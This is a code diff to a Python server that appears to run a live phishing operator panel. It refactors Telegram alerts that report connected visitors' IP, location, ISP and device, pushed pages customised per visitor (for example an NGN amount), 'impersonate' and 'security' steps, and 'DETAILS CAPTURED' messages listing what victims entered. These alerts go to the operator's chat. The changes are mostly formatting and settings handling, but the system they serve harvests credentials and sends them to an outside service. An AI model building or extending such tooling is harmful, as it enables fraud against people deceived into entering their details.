@@ -1094,6 +1094,45 @@ telegram_config_loaded = False
 CONFIG_FILE = Path(__file__).parent / "data" / "telegram_config.json"
 
 
+# Every on/off switch the Telegram settings can carry, with the value used
+# when it has never been set. The first block switches whole notifications on
+# and off; the second decides what each message prints (request: every detail
+# line must be the operator's choice).
+TG_BOOL_DEFAULTS: Dict[str, bool] = {
+    "enabled": False,
+    "notify_connect": True,
+    "notify_disconnect": True,
+    "notify_navigate": False,
+    "notify_impersonate": False,
+    "notify_lpv_workflow": True,
+    "notify_lpv_submit": True,
+    "notify_lpv_security": True,
+    "notify_lpv_final": True,
+    "notify_lpv_push": True,
+    # ---- what a message contains ----
+    # CLIENT CONNECTED is three independent groups. All three off = the bare
+    # header, all three on = the full environment dump.
+    "connect_show_identity": True,
+    "connect_show_location": True,
+    "connect_show_device": True,
+    # WORKFLOW STARTED / FINISHED: off = the headline alone.
+    "workflow_start_show_details": True,
+    "workflow_finish_show_details": True,
+    # A page pushed with values typed for that one visitor gets its own
+    # DETAILS CAPTURED shape (binding = value). Off = the plain field list.
+    "binding_details_enabled": True,
+}
+
+
+def _as_bool(value: Any, default: bool = True) -> bool:
+    """Interpret a config value that may arrive as a bool or a string."""
+    if value is None:
+        return default
+    if isinstance(value, str):
+        return value.strip().lower() not in {"", "0", "false", "off", "no"}
+    return bool(value)
+
+
 def _normalize_telegram_config(raw: Any) -> Dict[str, Any]:
     """Normalize current and legacy Admin Telegram config shapes."""
     if not isinstance(raw, dict):
@@ -1110,7 +1149,56 @@ def _normalize_telegram_config(raw: Any) -> Dict[str, Any]:
             normalized["enabled"] = raw.get("telegram_enabled")
         else:
             normalized["enabled"] = bool(normalized["bot_token"] and normalized["chat_id"])
+    # Store real booleans, so a value typed as "off" in the panel behaves the
+    # same after a reload as one saved by a checkbox.
+    for key, default in TG_BOOL_DEFAULTS.items():
+        if key in normalized:
+            normalized[key] = _as_bool(normalized[key], default)
     return normalized
+
+
+def _merge_telegram_save(
+    body: Dict[str, Any], current: Optional[Dict[str, Any]] = None
+) -> Dict[str, Any]:
+    """The config a save should persist: this request merged over the file.
+
+    A partial save must be partial. The mini admin posts only its own coarse
+    switches; before this, doing so reset every toggle it did not mention —
+    including the message-detail switches — back to its default. A key the
+    request omits now keeps whatever is already saved.
+    """
+    body = body if isinstance(body, dict) else {}
+    current = current if isinstance(current, dict) else {}
+
+    def _saved_bool(key: str, default: Optional[bool] = None) -> bool:
+        fallback = TG_BOOL_DEFAULTS.get(key, True) if default is None else default
+        if key in body:
+            return _as_bool(body.get(key), fallback)
+        if key in current:
+            return _as_bool(current.get(key), fallback)
+        return fallback
+
+    return {
+        "bot_token": str(body.get("bot_token") or "").strip(),
+        "chat_id": str(body.get("chat_id") or "").strip(),
+        "enabled": _saved_bool("enabled", True),
+        "notify_connect": _saved_bool("notify_connect"),
+        "notify_disconnect": _saved_bool("notify_disconnect"),
+        "notify_navigate": _saved_bool("notify_navigate"),
+        "notify_impersonate": _saved_bool("notify_impersonate"),
+        "notify_lpv_workflow": _saved_bool("notify_lpv_workflow"),
+        "notify_lpv_submit": _saved_bool("notify_lpv_submit"),
+        "notify_lpv_security": _saved_bool("notify_lpv_security"),
+        "notify_lpv_final": _saved_bool("notify_lpv_final"),
+        "notify_lpv_push": _saved_bool("notify_lpv_push"),
+        # What each message prints (see TG_BOOL_DEFAULTS).
+        "connect_show_identity": _saved_bool("connect_show_identity"),
+        "connect_show_location": _saved_bool("connect_show_location"),
+        "connect_show_device": _saved_bool("connect_show_device"),
+        "workflow_start_show_details": _saved_bool("workflow_start_show_details"),
+        "workflow_finish_show_details": _saved_bool("workflow_finish_show_details"),
+        "binding_details_enabled": _saved_bool("binding_details_enabled"),
+    }
 
 
 def load_telegram_config():
@@ -1222,12 +1310,123 @@ def _tg_reason(reason):
 
 
 def _tg_flag(flag: str, default: bool = True) -> bool:
-    val = (telegram_config or {}).get(flag)
-    if val is None:
-        return default
-    if isinstance(val, str):
-        return val.strip().lower() not in {"", "0", "false", "off", "no"}
-    return bool(val)
+    """One on/off setting from the live Telegram config."""
+    return _as_bool((telegram_config or {}).get(flag), default)
+
+
+def _tg_stamp(when: Optional[float] = None) -> str:
+    """The clock time a notification is about, in the server's local time.
+
+    Sortable and unambiguous, so two alerts from the same visitor can be told
+    apart at a glance on a phone.
+    """
+    try:
+        moment = datetime.fromtimestamp(when) if when else datetime.now()
+    except Exception:
+        moment = datetime.now()
+    return moment.strftime("%Y-%m-%d %H:%M:%S")
+
+
+def _tg_time_row(when: Optional[float] = None):
+    """The time branch every notification shares.
+
+    This row used to hold the last ten characters of the client id
+    (``_yehwgj9l9``), which told an operator nothing. The clock time is what
+    makes one message distinguishable from the next.
+    """
+    return ("\U0001F551", "Time", _tg_esc(_tg_stamp(when)))
+
+
+# ---------------------------------------------------------------------------
+# Message builders.  Kept out of the socket handlers so what an operator
+# receives can be read (and tested) without opening a session: the settings
+# decide the blocks, these functions decide the words.
+# ---------------------------------------------------------------------------
+
+def _tg_connected_message(
+    client_id: str,
+    *,
+    workflow_name: str = "",
+    workflow_via: str = "",
+    pass_code: str = "",
+    ip: str = "",
+    country: str = "",
+    region: str = "",
+    city: str = "",
+    isp: str = "",
+    device_type: str = "",
+    screen_size: str = "",
+    user_agent: str = "",
+) -> str:
+    """CLIENT CONNECTED, assembled from whichever groups are switched on."""
+    message = "\U0001F7E2 <b>CLIENT CONNECTED</b>"
+    blocks = []
+    if _tg_flag("connect_show_identity", True):
+        workflow_line = ""
+        if str(workflow_name or "").strip():
+            workflow_line = _tg_esc(workflow_name, 60)
+            if str(workflow_via or "").strip():
+                workflow_line += f" ({_tg_esc(workflow_via, 20)})"
+        pass_line = ""
+        if str(pass_code or "").strip():
+            pass_line = f"<code>{_tg_esc(pass_code, 12)}…</code>"
+        blocks.append(_tg_tree([
+            _tg_time_row(),
+            ("\U0001F680", "Workflow", workflow_line),
+            ("\U0001F511", "Pass code", pass_line),
+        ]))
+    if _tg_flag("connect_show_location", True):
+        blocks.append(
+            "\U0001F30D <b>Location &amp; network</b>\n"
+            + _tg_tree([
+                ("\U0001F6F0", "IP address", f"<code>{_tg_esc(ip)}</code>"),
+                ("\U0001F30E", "Country", _tg_esc(country or "-")),
+                ("\U0001F4CD", "Region", _tg_esc(region or "-")),
+                ("\U0001F3D9", "City", _tg_esc(city or "-")),
+                ("\U0001F4E1", "Internet provider", _tg_esc(isp, 60)),
+            ])
+        )
+    if _tg_flag("connect_show_device", True):
+        device_line = _tg_esc(device_type or "-")
+        if str(screen_size or "").strip():
+            device_line += f" ({_tg_esc(screen_size)})"
+        blocks.append(
+            "\U0001F4F1 <b>Device</b>\n"
+            + _tg_tree([
+                ("\U0001F5A5", "Type", device_line),
+                ("\U0001F9EC", "Browser", f"<code>{_tg_esc(user_agent, 90)}</code>"),
+            ])
+        )
+    for block in blocks:
+        if str(block or "").strip():
+            message += "\n\n" + block
+    return message
+
+
+def _tg_workflow_started_message(workflow: Dict[str, Any]) -> str:
+    """WORKFLOW STARTED — headline only when its details are switched off."""
+    message = "\U0001F680 <b>WORKFLOW STARTED</b>"
+    if not _tg_flag("workflow_start_show_details", True):
+        return message
+    workflow = workflow or {}
+    return message + "\n\n" + _tg_tree([
+        ("\U0001F4CB", "Workflow", _tg_esc(workflow.get("name") or workflow.get("id") or "-", 60)),
+        ("\U0001F522", "Steps", str(len(workflow.get("steps") or []))),
+        _tg_time_row(),
+    ])
+
+
+def _tg_workflow_finished_message(workflow: Dict[str, Any], steps_completed: int) -> str:
+    """WORKFLOW FINISHED — same treatment as STARTED."""
+    message = "\U0001F3C1 <b>WORKFLOW FINISHED</b>"
+    if not _tg_flag("workflow_finish_show_details", True):
+        return message
+    workflow = workflow or {}
+    return message + "\n\n" + _tg_tree([
+        ("\U0001F4CB", "Workflow", _tg_esc(workflow.get("name") or workflow.get("id") or "-", 60)),
+        ("\u2705", "Steps completed", str(steps_completed)),
+        _tg_time_row(),
+    ])
 
 
 def _tg_hint(message: str, width: int = 60) -> str:
@@ -1484,6 +1683,136 @@ _lpv_final_fields: Dict[str, Dict[str, Any]] = {}
 FINAL_FLUSH_DELAY = 1.5
 _lpv_final_timers: Dict[str, asyncio.TimerHandle] = {}
 
+# What the page on the visitor's screen was pushed with. A push may carry
+# values the operator typed for that one visitor ("amount = NGN 50,000");
+# DETAILS CAPTURED uses this to announce the customised copy instead of an
+# anonymous field list. Keyed by client id, dropped when the next page is
+# pushed or after six hours (the same lifetime as _BIND_RENDERS below).
+_LPV_PUSH_BINDINGS: Dict[str, Dict[str, Any]] = {}
+_PUSH_BINDINGS_TTL = 6 * 3600
+
+
+def _bind_label_map(page_id: str) -> Dict[str, str]:
+    """Binding name -> the label the panel shows for it."""
+    try:
+        from page_bindings import fields_for
+        page = lpv_store.get_page(page_id) or {}
+        return {
+            str(f.get("name") or ""): str(f.get("label") or f.get("name") or "")
+            for f in fields_for(page.get("bindings") or [])
+            if f.get("name")
+        }
+    except Exception:
+        return {}
+
+
+def _remember_push_bindings(
+    client_id: str, page_id: str, page_name: str, values: Optional[Dict[str, str]]
+) -> None:
+    """Remember which values this visitor's current page was pushed with.
+
+    Called from every delivery path (workflow step, click action, manual push).
+    A page pushed without values clears the record, so an old binding never
+    colours a later page.
+    """
+    try:
+        key = str(client_id or "")
+        if not key:
+            return
+        # Same six-hour lifetime as the render token itself.
+        cutoff = time.time() - _PUSH_BINDINGS_TTL
+        for stale in [k for k, v in _LPV_PUSH_BINDINGS.items() if v.get("at", 0) < cutoff]:
+            _LPV_PUSH_BINDINGS.pop(stale, None)
+        clean = {
+            str(k): str(v)
+            for k, v in (values or {}).items()
+            if str(v if v is not None else "").strip()
+        }
+        if not clean:
+            _LPV_PUSH_BINDINGS.pop(key, None)
+            return
+        _LPV_PUSH_BINDINGS[key] = {
+            "page_id": str(page_id or ""),
+            "page_name": page_name or "",
+            "values": clean,
+            "labels": _bind_label_map(page_id),
+            "at": time.time(),
+        }
+    except Exception:
+        pass
+
+
+def _tg_field_lines(fields: Dict[str, Any]) -> str:
+    """The entered values as branch lines (bounded, oldest first)."""
+    items = list((fields or {}).items())[:15]
+    lines = []
+    last = len(items) - 1
+    for i, (k, v) in enumerate(items):
+        if isinstance(v, list):
+            v = ", ".join(str(x) for x in v)
+        branch = _TG_ELL if i == last else _TG_TEE
+        lines.append(
+            f"{branch} <b>{_tg_esc(k, 32)}</b> \u2014 <code>{_tg_esc(v, 120)}</code>"
+        )
+    return "\n".join(lines)
+
+
+def _tg_binding_lines(push: Dict[str, Any]) -> str:
+    """``label = value`` for every value the page was pushed with."""
+    values = (push or {}).get("values") or {}
+    labels = (push or {}).get("labels") or {}
+    rows = list(values.items())[:15]
+    lines = []
+    last = len(rows) - 1
+    for i, (name, value) in enumerate(rows):
+        branch = _TG_ELL if i == last else _TG_TEE
+        label = labels.get(name) or name
+        lines.append(
+            f"{branch} <b>{_tg_esc(label, 40)}</b> = <code>{_tg_esc(value, 120)}</code>"
+        )
+    return "\n".join(lines)
+
+
+def _tg_details_message(
+    client_id: str, buf: Dict[str, Any], fields: Dict[str, Any], reason: str = ""
+) -> str:
+    """Render one DETAILS CAPTURED notification.
+
+    A page that was pushed with values typed for this visitor is announced in
+    its own shape: page name, clock time, and every ``binding = value`` the
+    page is showing — so the operator knows which customised copy is answering
+    questions. Any other page keeps the plain page/when/time + field list.
+    """
+    page_label = _tg_esc(buf.get("page_name") or buf.get("page_id") or "-", 60)
+    when_label = _tg_esc(_tg_reason(reason), 40)
+    fields_block = _tg_field_lines(fields)
+    push = _LPV_PUSH_BINDINGS.get(str(client_id or "")) or {}
+    same_page = bool(push) and str(push.get("page_id") or "") == str(buf.get("page_id") or "")
+    if same_page and push.get("values") and _tg_flag("binding_details_enabled", True):
+        message = (
+            "\U0001F4CC <b>DETAILS CAPTURED \u00b7 CUSTOMISED PAGE</b>\n\n"
+            + _tg_tree([
+                ("\U0001F4C4", "Page", page_label),
+                ("\u26A1", "When", when_label),
+                _tg_time_row(),
+            ])
+            + "\n\n\U0001F4A0 <b>Page values</b>\n"
+            + _tg_binding_lines(push)
+        )
+        if fields_block:
+            message += "\n\n\U0001F510 <b>What they entered</b>\n" + fields_block
+        return message
+    return (
+        "\U0001F4DD <b>DETAILS CAPTURED</b>\n\n"
+        + _tg_tree([
+            ("\U0001F4C4", "Page", page_label),
+            ("\u26A1", "When", when_label),
+            _tg_time_row(),
+        ])
+        + "\n\n\U0001F510 <b>What they entered</b>\n"
+        + fields_block
+    )
+
 
 def _lpv_final_cancel_timer(client_id: str) -> None:
     t = _lpv_final_timers.pop(client_id, None)
@@ -1519,26 +1848,8 @@ def _lpv_final_flush(client_id: str, reason: str = "") -> None:
     if not fields:
         return
     try:
-        items = list(fields.items())[:15]
-        lines = []
-        last = len(items) - 1
-        for i, (k, v) in enumerate(items):
-            if isinstance(v, list):
-                v = ", ".join(str(x) for x in v)
-            branch = _TG_ELL if i == last else _TG_TEE
-            lines.append(
-                f"{branch} <b>{_tg_esc(k, 32)}</b> \u2014 <code>{_tg_esc(v, 120)}</code>"
-            )
-        body = "\n".join(lines)
         tg_notify(
-            "\U0001F4DD <b>DETAILS CAPTURED</b>\n\n"
-            + _tg_tree([
-                ("\U0001F4C4", "Page", _tg_esc(buf.get('page_name') or buf.get('page_id') or '-', 60)),
-                ("\u26A1", "When", _tg_esc(_tg_reason(reason), 40)),
-                ("\U0001F464", "Client", f"<code>{_tg_esc(str(client_id)[-10:])}</code>"),
-            ])
-            + "\n\n\U0001F510 <b>What they entered</b>\n"
-            + body,
+            _tg_details_message(client_id, buf, fields, reason),
             "notify_lpv_final",
         )
     except Exception:
@@ -5754,6 +6065,10 @@ async def get_telegram_config(request: Request):
             "notify_navigate": base["telegram_notify_on_navigation"],
             "source": "config.py",
         }
+    # Message-detail settings always have a value to show, even before the
+    # first save (they all default to on, i.e. today's full messages).
+    for _key, _default in TG_BOOL_DEFAULTS.items():
+        effective.setdefault(_key, _default)
     effective["configured"] = bool(effective.get("bot_token") and effective.get("chat_id"))
     return JSONResponse({
         "success": True,
@@ -5778,26 +6093,13 @@ async def save_telegram_config(request: Request):
         # channel usernames, and other destination forms without a local
         # whitelist or format filter.
         global telegram_config
-        bot_token = str(body.get("bot_token") or "").strip()
-        chat_id = str(body.get("chat_id") or "").strip()
-        enabled_value = body.get("enabled", True)
-        if isinstance(enabled_value, str):
-            enabled_value = enabled_value.strip().lower() not in {"", "0", "false", "off", "no"}
-        telegram_config = {
-            "bot_token": bot_token,
-            "chat_id": chat_id,
-            "enabled": bool(enabled_value),
-            "notify_connect": body.get("notify_connect", True),
-            "notify_disconnect": body.get("notify_disconnect", True),
-            "notify_navigate": body.get("notify_navigate", False),
-            "notify_impersonate": body.get("notify_impersonate", False),
-            "notify_lpv_workflow": body.get("notify_lpv_workflow", True),
-            "notify_lpv_submit": body.get("notify_lpv_submit", True),
-            "notify_lpv_security": body.get("notify_lpv_security", True),
-            "notify_lpv_final": body.get("notify_lpv_final", True),
-            "notify_lpv_push": body.get("notify_lpv_push", True),
-            "updated_at": datetime.now().isoformat()
-        }
+        # Merge this save over what is already stored: keys the request does
+        # not carry (the mini admin sends only its own switches) keep their
+        # saved value instead of being reset to a default.
+        telegram_config = _merge_telegram_save(body, telegram_config)
+        telegram_config["updated_at"] = datetime.now().isoformat()
+        bot_token = telegram_config["bot_token"]
+        chat_id = telegram_config["chat_id"]
         
         if not bot_token or not chat_id:
             logger.warning(
@@ -7996,6 +8298,9 @@ async def _deliver_page(
             {"reason": "client_offline", "page_id": served_id, "source": source},
         )
         return False, page
+    # Remember what this page was customised with, so its DETAILS CAPTURED
+    # message can name the values instead of a bare field list.
+    _remember_push_bindings(client_id, served_id, page["name"], values)
     lpv_store.set_current_page(client_id, served_id, page["name"])
     lpv_store.record_event(
         client_id, record_kind,
@@ -9300,15 +9605,9 @@ async def _run_workflow_on_client(
         }, connection_token=connection_token)
     except Exception:
         pass
-    tg_notify(
-        "\U0001F680 <b>WORKFLOW STARTED</b>\n\n"
-        + _tg_tree([
-            ("\U0001F4CB", "Workflow", _tg_esc(workflow.get('name') or workflow.get('id') or '-', 60)),
-            ("\U0001F522", "Steps", str(len(workflow.get('steps') or []))),
-            ("\U0001F464", "Client", f"<code>{_tg_esc(str(client_id)[-10:])}</code>"),
-        ]),
-        "notify_lpv_workflow",
-    )
+    # WORKFLOW STARTED: the headline is always sent; the detail lines are the
+    # operator's choice (off = "just say it started").
+    tg_notify(_tg_workflow_started_message(workflow), "notify_lpv_workflow")
     # Track last pushed page so redirect events have a page context.
     last_page_id = None
     last_page_name = None
@@ -9373,6 +9672,9 @@ async def _run_workflow_on_client(
                 logger.debug(f"[workflow] client {client_id} offline at page step {i}, aborting chain")
                 break
             if ok:
+                # What this step's page was customised with (see
+                # _remember_push_bindings) — DETAILS CAPTURED names them.
+                _remember_push_bindings(client_id, page_id, page["name"], step_values)
                 lpv_store.set_current_page(client_id, page_id, page["name"])
                 last_page_id = page_id
                 last_page_name = page["name"]
@@ -9615,15 +9917,8 @@ async def _run_workflow_on_client(
         "page_id": None, "page_name": None,
         "payload": {"workflow_id": workflow.get("id"), "name": workflow.get("name")},
     })
-    tg_notify(
-        "\U0001F3C1 <b>WORKFLOW FINISHED</b>\n\n"
-        + _tg_tree([
-            ("\U0001F4CB", "Workflow", _tg_esc(workflow.get('name') or workflow.get('id') or '-', 60)),
-            ("\u2705", "Steps completed", str(len(steps))),
-            ("\U0001F464", "Client", f"<code>{_tg_esc(str(client_id)[-10:])}</code>"),
-        ]),
-        "notify_lpv_workflow",
-    )
+    # WORKFLOW FINISHED: same treatment as STARTED — details are optional.
+    tg_notify(_tg_workflow_finished_message(workflow, len(steps)), "notify_lpv_workflow")
 
 
 @app.post("/api/lpv/workflows/{workflow_id}/run/{client_id}")
@@ -10535,14 +10830,7 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
                 ip = websocket.client.host if websocket.client else "Unknown"
             except Exception:
                 ip = "Unknown"
-        if wf_boot:
-            wf_label = f"{_tg_esc(wf_boot.get('name') or 'unnamed', 60)}"
-            wf_via = "link" if per_link_id else "global auto-run"
-            wf_line = f"{wf_label} ({wf_via})"
-        else:
-            wf_line = ""
         auth_frag = (init_data.get("auth_token") or "")[:8]
-        link_line = f"<code>{_tg_esc(auth_frag)}\u2026</code>" if auth_frag else ""
         if init_data.get("is_mobile"):
             device_type = "Mobile"
         elif init_data.get("is_touch"):
@@ -10556,26 +10844,25 @@ async def _enter_lpv_only_mode(websocket: WebSocket, init_data: dict) -> None:
         _region = (loc.get('state') or '-').strip()
         _city = (loc.get('city') or '-').strip()
         _isp = (loc.get("isp") or "").strip()
+        # Three independent groups, each switched on its own in the Admin
+        # panel: an operator watching one thing can ask for just the device,
+        # just the location, or just who arrived. All three off leaves the
+        # headline alone. See _tg_connected_message.
         tg_notify(
-            "\U0001F7E2 <b>CLIENT CONNECTED</b>\n\n"
-            + _tg_tree([
-                ("\U0001F464", "Client", f"<code>{_tg_esc(str(client_id)[-10:])}</code>"),
-                ("\U0001F680", "Workflow", wf_line),
-                ("\U0001F511", "Pass code", link_line),
-            ])
-            + "\n\n\U0001F30D <b>Location &amp; network</b>\n"
-            + _tg_tree([
-                ("\U0001F6F0", "IP address", f"<code>{_tg_esc(ip)}</code>"),
-                ("\U0001F30E", "Country", _tg_esc(_country)),
-                ("\U0001F4CD", "Region", _tg_esc(_region)),
-                ("\U0001F3D9", "City", _tg_esc(_city)),
-                ("\U0001F4E1", "Internet provider", _tg_esc(_isp, 60)),
-            ])
-            + "\n\n\U0001F4F1 <b>Device</b>\n"
-            + _tg_tree([
-                ("\U0001F5A5", "Type", f"{_tg_esc(device_type)} ({_tg_esc(size)})"),
-                ("\U0001F9EC", "Browser", f"<code>{_tg_esc(ua, 90)}</code>"),
-            ]),
+            _tg_connected_message(
+                client_id,
+                workflow_name=(wf_boot.get("name") or "") if wf_boot else "",
+                workflow_via=("link" if per_link_id else "global auto-run") if wf_boot else "",
+                pass_code=auth_frag,
+                ip=ip,
+                country=_country,
+                region=_region,
+                city=_city,
+                isp=_isp,
+                device_type=device_type,
+                screen_size=size,
+                user_agent=ua,
+            ),
             "notify_connect",
         )
     except Exception:
@@ -12062,6 +12349,12 @@ async def admin_websocket_endpoint(websocket: WebSocket):
                                         "spinner_url": _domain_spinner_url_for_page(page_id),
                                     })
                                     if ok:
+                                        # Values typed here are what this
+                                        # page is showing; DETAILS CAPTURED
+                                        # will name them.
+                                        _remember_push_bindings(
+                                            client_id, page_id, page["name"], bind_values
+                                        )
                                         lpv_store.set_current_page(
                                             client_id, page_id, page["name"]
                                         )
